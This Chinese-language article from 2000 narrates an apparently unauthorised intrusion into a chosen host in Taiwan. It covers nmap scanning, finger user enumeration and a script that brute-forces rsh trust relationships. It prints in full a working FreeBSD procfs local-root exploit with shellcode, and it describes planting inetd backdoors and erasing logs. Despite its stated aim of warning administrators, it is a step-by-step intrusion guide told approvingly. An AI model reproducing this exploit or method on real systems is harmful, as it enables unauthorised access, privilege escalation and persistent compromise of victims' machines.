---
title: "一次入侵过程"
date: 2000-04-08T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-33"
---

(quack_at_xfocus.org)

入侵过程

--------

by quack


本文的写作目的仅仅是为了给某些粗心大意的网络管理人员一个警告――internet是

有趣但十分脆弱的，当你的计算机放在互联网上给人们提供信息与服务的同时，会引

来网络中的“好奇者”的窥探。而安全性与便利性是一对矛盾……在你对自己的网络

做了一个安全策略考量之后，你应该确定你愿意以多大的风险来使用一些方便的服务，

当然这些服务――比如rlogin，可能只会使你少输入一次密码……


首先是确定目标――撞大运乱挑一个吧，试试能不能成功……呵，于是登上yahoo，上

taiwan的站点小遛了一下……唔，这个还不错，我们姑且称其为[www.targe.com](http://www.targe.com/)……还

是先ping一下看看情势如何――别碰上有墙的就逊了……


C:\>ping [www.targe.com](http://www.targe.com/)


Pinging [www.targe.com](http://www.targe.com/) [111.111.111.111] with 32 bytes of data:


Reply from 111.111.111.111: bytes=32 time=621ms TTL=241

Reply from 111.111.111.111: bytes=32 time=620ms TTL=241

Reply from 111.111.111.111: bytes=32 time=611ms TTL=241

Reply from 111.111.111.111: bytes=32 time=591ms TTL=241


速度还是很快的嘛……那就开始吧……


先登上某台跳板台湾的机器――这样安全一些，不会留下你自己的IP……(当然，说句

题外话――这样要追查到还不是很困难，曾经有个朋友同我说过，南方某大学一次被

黑，种种迹象都表明黑客来自美国，IP、更改后主页上留下的话语……朋友受托去补

漏查源，发现那IP是美国一个提供免费shell的服务供应商……于是申请了一个shell，

通过一系列动作成为root，查看系统日志――真相大白，IP居然指向那家大学自身)。


通过跳板还有一个好处――如果你的尝试失败，在系统日志里留下来的是台湾本土的

IP，这样的登陆失败命令比较不会引起系统管理员的注意……


C:\>nc ***.***.***.*** 12345


就登上跳板了，12345端口里我预留了一个suid的shell……


好了，祭起宝刀――nmap……


# ./nmap -sT -O 111.111.111.111


Starting nmap V. 2.3BETA12 by Fyodor (fyodor@dhp.com, [www.insecure.org/nmap/](http://www.insecure.org/nmap/))


Interesting ports on [www.targe.com](http://www.targe.com/) (111.111.111.111):

Port    State       Protocol  Service

7       open        tcp       echo

9       open        tcp       discard

19      open        tcp       chargen

21      open        tcp       ftp

23      open        tcp       telnet

25      open        tcp       smtp

37      open        tcp       time

79      open        tcp       finger

80      open        tcp       http

111     open        tcp       sunrpc

443     open        tcp       https

512     open        tcp       exec

513     open        tcp       login

514     open        tcp       shell

515     open        tcp       printer

540     open        tcp       uucp

3306    open        tcp       mysql


TCP Sequence Prediction: Class=random positive increments

                         Difficulty=55346 (Worthy challenge)

No OS matches for host (If you know what OS is running on it

…………

…………

Nmap run completed -- 1 IP address (1 host up) scanned in 17 seconds


唔，运气还不错，提供的服务不少，估计漏也少不到哪儿去……只是没判断出系统

类型，这些服务里看上去可以利用的有：


Port    State       Protocol  Service


21      open        tcp       ftp

25      open        tcp       smtp

79      open        tcp       finger

80      open        tcp       http

111     open        tcp       sunrpc

512     open        tcp       exec

513     open        tcp       login

514     open        tcp       shell

540     open        tcp       uucp

3306    open        tcp       mysql


最近rpc攻击非常流行，原因之一恐怕是方便易行――只要存在漏洞，远程就可以

得到一个rootshell……甚至对计算机完全不懂的外行也能轻易实施，呵，那咱们

来看看这个111 port的sunrpc里有什么奥妙吧……


# rpcinfo -p 111.111.111.111&

21404

#    program vers proto   port  service

    100000    2   tcp    111  rpcbind

    100000    2   udp    111  rpcbind


咦，看来没戏唱哦……好在还有那么多服务，待偶慢慢试来……

看看是什么FTP服务器软件吧，说不定有远程溢出的漏洞呢


# ./nc 111.111.111.111 21

#


乖乖龙的东，什么输出也没有就关上了，这是如何一回事？


C:\>ftp 111.111.111.111

Connected to 111.111.111.111.

Connection closed by remote host.


呵呵，看来过滤掉了嘛……怎么办？看看25端口是运行什么SMTP服务的吧……


# ./nc 111.111.111.111 25

220 ***-***-***-*** ESMTP Sendmail 8.9.3/8.9.3; Wed, 5 Apr 2000 08:56:59 GMT


Sendmail 8.9.3/8.9.3？好象没有什么致命的漏洞呀……


看看是什么WEB服务器先……


# (echo "head /http/1.0";echo;echo)|./nc -w 3 111.111.111.111 80


<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">

<HTML><HEAD>

<TITLE>501 Method Not Implemented</TITLE>

</HEAD><BODY>

<H1>Method Not Implemented</H1>

head to /http/1.0 not supported.<P>

Invalid method in request head /http/1.0<P>

<HR>

<ADDRESS>Apache/1.3.9 Server at ***-***-***-*** Port 80</ADDRESS>

</BODY></HTML>


阿帕奇这个版本的东东至少偶的印象中没有什么“死穴”……


好在开了finger，俺就土土地先把用户列表弄出来吧……


finger O@[www.targe.com](http://www.targe.com/)


[[www.targe.com.tw]](http://www.targe.com.tw])


root

aaa

bbb

ccc

ddd


总算有点收获……，那么下一步该做什么呢？既然这台主机开了512、513、514的r

系列服务，那就值得尝试一下，说不定哪个偷懒的家伙直接在.rhosts里设了


+ username


那我就爽了……


顺手写了个shell script，让它去一个一个地尝试rsh命令，传到肉鸡上


# chmod 700 rsh.sh

# nohup ./rsh.sh [www.targe.com](http://www.targe.com/)


它会自动地在/etc/passwd和/etc/shadow里加上finger出来的用户名，然后su过去，

再对远程目标111.111.111.111执行rsh命令，成功则返回该用户名……然后将备份的

passwd和shadow再拷回去……删除临时文件，生成报告文件……(或许是我对.rhosts

的理解还有问题，有时我在机里加上+ +但rcp时还会报Permission denied或者connect

refused,所以干脆都su成用户――或许太笨;)


我便再去MUD里当我的大虾了……半个小时后回来


登上肉鸡，读取报告文件.rsh.txt


# cat ./.rsh.txt

ccc


hehe，非常抱歉，看来俺得到一个shell了……


进去看看……


# rlogin -l ccc 111.111.111.111


Last login: Fri Mar 24 19:04:50 from 202.102.2.147

Copyright (c) 1980, 1983, 1986, 1988, 1990, 1991, 1993, 1994

        The Regents of the University of California.  All rights reserved.


FreeBSD 3.2-RELEASE (GENERIC) #0: Tue May 18 04:05:08 GMT 1999


You have mail.


呵，原来是FreeBSD 3.2-RELEASE呀，感觉不错，进来了，看看我的权限如何吧……


> id

id

uid=1003(ccc) gid=1003(ccc) groups=1003(ccc)


看来能做的事还相当有限噢……再看看系统里有没有别人先……


> w

w

 9:03PM  up 6 days,  2:37, 3 users, load averages: 0.00, 0.01, 0.00

USER             TTY      FROM              LOGIN@  IDLE WHAT

ccc               p0       **.**.***.***       6:04PM  2:41 -tcsh (tcsh)


不错，就我自在逍遥……看看passwd吧……


> cat /etc/passwd

cat /etc/passwd

root:*:0:0:Charlie &:/root:/usr/local/bin/bash

aaa:*:1005:2000::/home/www:/usr/local/bin/tcsh

bbb:*:1006:1006::/home/bbb:/usr/local/bin/tcsh

ccc:*:1003:1003::/home/ccc:/usr/local/bin/tcsh

ddd:*:1008:1008:ddd:/home/www:/usr/local/bin/tcsh

eee:*:1009:1009:eee:/home/eee:/usr/local/bin/tcsh


很明显/home/www就是www用户的主目录了……先看看俺ccc对该目录有没有写权限


> echo test >/home/www/test

test: Permission denied.


看来如果想改他的主页，还得另外想办法啦……不过都已经有了一个用户shell了，最

高权限其实也只有一步之遥啦，好吧，翻翻数据库里有什么关于FreeBSD 3.2的记录，

看来东西不多呀……而且有些还是安装外来软件包之后才带来的风险……


先看看有没有编译的权限再说吧，否则还得找一台BSD来编译……


> ls /usr/local/bin|grep gcc

gcc


一般情况下自己安装的gcc是会在这个目录的啦，否则最好find一下比较保险。


这下方便了……可以直接传代码上来试……

试了几个之后我找到这么个东西：


/* by Nergal */

#include <errno.h>

#include <signal.h>

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <fcntl.h>

#include <string.h>

#include <signal.h>

#include <sys/wait.h>


char            shellcode[] =

"\xeb\x0a\x62\x79\x20\x4e\x65\x72\x67\x61\x6c\x20"

"\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"

"\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"

"\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"

"\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04\x00";


#define PASSWD "./passwd"

void

sg(int x)

{

}

int

main(int argc, char **argv)

{

    unsigned int stack, shaddr;

    int             pid,schild;

    int             fd;

    char            buff[40];

    unsigned int    status;

    char            *ptr;

    char            name[4096];

    char         sc[4096];

    char            signature[] = "signature";


    signal(SIGUSR1, sg);

if (symlink("usr/bin/passwd",PASSWD) && errno!=EEXIST)

{

perror("creating symlink:");

exit(1);

}

    shaddr=(unsigned int)&shaddr;

    stack=shaddr-2048;

    if (argc>1)

    shaddr+=atoi(argv[1]);

    if (argc>2)

    stack+=atoi(argv[2]);

    fprintf(stderr,"shellcode addr=0x%x stack=0x%x\n",shaddr,stack);

    fprintf(stderr,"Wait for \"Press return\" prompt:\n");

    memset(sc, 0x90, sizeof(sc));

    strncpy(sc+sizeof(sc)-strlen(shellcode)-1, shellcode,strlen(shellcode));

    strncpy(sc,"EGG=",4);

memset(name,'x',sizeof(name));

    for (ptr = name; ptr < name + sizeof(name); ptr += 4)

        *(unsigned int *) ptr = shaddr;

    name[sizeof(name) - 1] = 0;


    pid = fork();

    switch (pid) {

    case -1:

        perror("fork");

        exit(1);

    case 0:

        pid = getppid();

        sprintf(buff, "/proc/%d/mem", pid);

        fd = open(buff, O_RDWR);

        if (fd < 0) {

            perror("open procmem");

            wait(NULL);

            exit(1);

        }

        /* wait for child to execute suid program */

        kill(pid, SIGUSR1);

        do {

            lseek(fd, (unsigned int) signature, SEEK_SET);

        } while

            (read(fd, buff, sizeof(signature)) == sizeof(signature) &&

             !strncmp(buff, signature, sizeof(signature)));

        lseek(fd, stack, SEEK_SET);

        switch (schild = fork()) {

        case -1:

            perror("fork2");

            exit(1);

        case 0:


            dup2(fd, 2);

            sleep(2);

            execl(PASSWD, name, "blahblah", 0);

            printf("execl failed\n");

            exit(1);

        default:

            waitpid(schild, &status, 0);

        }

        fprintf(stderr, "\nPress return.\n");

        exit(1);

    default:

        /* give parent time to open /proc/pid/mem */

        pause();

        putenv(sc);

        execl(PASSWD, "passwd", NULL);

        perror("execl");

        exit(0);


    }

}


偶说一下这个漏洞的由来吧：


早在1997年在*BSD里就发现了一个致命漏洞存在于procfs可以导致本地用户夺取root

权限，*BSD核心中做了简单的修补，但不幸的是，时至今日，我们仍然可以通过对

/proc/pid/mem的操作夺取root权限……当然，要利用这个程序拿ROOT，procfs文件系统

必须是mounted的，在默认的FreeBSD3.3里是mounted着的。我们先来看看这台机器上的

情况如何，别白忙一场……


# /sbin/mount

/dev/wd0s1a on / (local, writes: sync 12 async 134)

/dev/wd0s1h on /home (local, writes: sync 2 async 120)

/dev/wd0s1f on /usr (local, writes: sync 2 async 93)

/dev/wd0s1g on /usr/local (local, writes: sync 2 async 16)

/dev/wd0s1e on /var (local, writes: sync 118 async 498)

procfs on /proc (local)


呵呵不错，看到没有那procfs on字样？看来老天帮忙了……


一个无特权的进程A自我调用子进程B，A打开/proc/pid-of-B/mem，B执行一个setuid的

二进制程序，现在B与A的euid已经不同了，但A仍然通过/proc/pid-of-B/mem的描述符控

制B进程，就可能做很多事了……


 In order to stop this exploit,  an additional check was added to the code

 responsible for I/O on file descriptors referring to procfs pseudofiles. In 

    miscfs/procfs/procfs.h (from FreeBSD 3.0) we read: 

          /* 

         * Check to see whether access to target process is allowed 

         * Evaluates to 1 if access is allowed. 

         */ 

        #define CHECKIO(p1, p2) \ 

             ((((p1)->p_cred->pc_ucred->cr_uid == (p2)->p_cred->p_ruid) && \ 

               ((p1)->p_cred->p_ruid == (p2)->p_cred->p_ruid) && \ 

               ((p1)->p_cred->p_svuid == (p2)->p_cred->p_ruid) && \ 

               ((p2)->p_flag & P_SUGID) == 0) || \ 

              (suser((p1)->p_cred->pc_ucred, &(p1)->p_acflag) == 0)) 

    As we see, process performing I/O (p1) must have the same uids  as 

    target process (p2),  unless... p1 has  root priviledges.   So, if 

    we can trick a setuid program X into writing to a file  descriptor 

    F referring to a procfs  object, the above check will  not prevent 

    X from writing. As some of readers certainly already have guessed, 

    F's number will  be 2, stderr  fileno... We can  pass to a  setuid 

    program an appropriately lseeked file descriptor no 2 (pointing to 

    some /proc/pid/mem),  and this  program will  blindly write  there 

    error messages.  Such output is often partially controllable (e.g. 

    contains program's name),  so we can  write almost arbitrary  data 

    onto other setuid program's memory. 

      

      This scenario looks similar to 

    

      close(fileno(stderr)); execl("setuid-program",...) 

      

    exploits, but in  fact differs profoundly.   It exploits the  fact 

    that  the  properties  of  a  fd  pointing  into  procfs  is   not 

    determined fully  by "open"  syscall (all  other fd  are; skipping 

    issues  related  to  securelevels).   These  properties can change 

    because of priviledged code execution. As a result,  (priviledged) 

    children of  some process  P can  inherit a  fd opened read-write, 

    though P can't directly gain such fd via open syscall. 


懒得把它弄成中文的了……感兴趣则看，不感兴趣就跳过吧……


好，那就把漏洞利用程序rcp过去吧


>rcp root@***.***.***.**:/tmp/pcnfs.c /tmp/


其中***.***.***.**是以前的一个倒霉蛋，/下被加了+ +的家伙……


编译运行――可能得对程序做一些小小的更改……


>gcc pcnfs.c -o p

>./p -4000 -10000

shellcode addr=0xbfbfcd4c stack=0xbfbfaddc

Wait for "Press return" prompt:

New password:

Press return.


id

uid=1003(ccc) gid=1003(ccc) euid=0(root) groups=1003(ccc)


wowowo!我是root啦……哈哈，也就是说，俺现在在这个系统里可以为所欲为了……

再试试对/home/www目录有没有写权限吧……


echo test>/home/www/test.txt;ls /home/www|grep test

test.txt


呵，好了，大功告成……一般情况下做到这步后你原来修改主页的欲望就会消散了，毕

竟咱们不是以破坏系统为乐的人，我们只是希望网络社会更加健康，所以――俺也没改

什么东西，只是留了几个后门就bye-bye了……咱们有太多的系统可供学习，只好在这些

远程机器上多学多看了――所以，留个后门还是必要的啦。


当然擦脚印等等活还是要干的，让人发现系统曾经有人尝试过入侵究竟不是一件好事。万

事OK后就可以走人了。


这个root有重新启动系统的坏习惯，三天后我再登上系统时，发现


# id

uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 

5(operator), 20(staff), 31(guest)


呵，看来往/etc/inetd.conf里加的shell由root大人自己启动了……至于这个系统，其实它

有安装防火墙软件的，要不是其中有一个用户偷懒，还是很难入侵成功的……希望这对国内

的管理员也是一个警示吧，因为国内的网络安全状况实在还是不容乐观……


=================================================================================


本文出自[http://focus.silversand.net](http://focus.silversand.net/)；如要转载请注明出处。

我水平较菜，请高手多指点，mailto:quack@antionline.org
